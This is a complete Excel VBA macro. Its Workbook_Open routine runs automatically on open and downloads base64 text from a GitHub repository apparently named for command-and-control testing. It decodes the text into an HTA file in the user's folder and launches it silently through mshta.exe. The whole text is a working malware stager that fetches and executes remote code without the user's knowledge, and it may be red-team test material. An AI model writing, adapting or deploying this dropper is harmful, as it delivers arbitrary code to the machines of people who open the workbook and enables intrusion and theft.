Sub Workbook_Open()
    Dim xmlHttp As Object, xmlDoc As Object, b64Node As Object, stream As Object
    Dim url As String, base64Text As String, docPath As String, localHtaPath As String
    Dim cmd As String

    docPath = ThisWorkbook.Path

    If docPath = "" Then
        docPath = CreateObject("WScript.Shell").SpecialFolders("MyDocuments")
    End If

    localHtaPath = docPath & "\temp_stage.hta"

    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    url = "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/build/encoded_attack.txt"
    
    xmlHttp.Open "GET", url, False
    xmlHttp.Send ""
    
    If xmlHttp.Status <> 200 Then Exit Sub
    base64Text = xmlHttp.ResponseText

    Set xmlDoc = CreateObject("Microsoft.XMLDOM")
    Set b64Node = xmlDoc.CreateElement("tmp")
    b64Node.DataType = "bin.base64"
    b64Node.Text = base64Text

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary 모드
    stream.Open
    stream.Write b64Node.NodeTypedValue
    stream.SaveToFile localHtaPath, 2
    stream.Close

    ChDrive docPath
    ChDir docPath

    cmd = "C:\Windows\System32\mshta.exe " & Chr(34) & localHtaPath & Chr(34)
    Call Shell(cmd, 0)
End Sub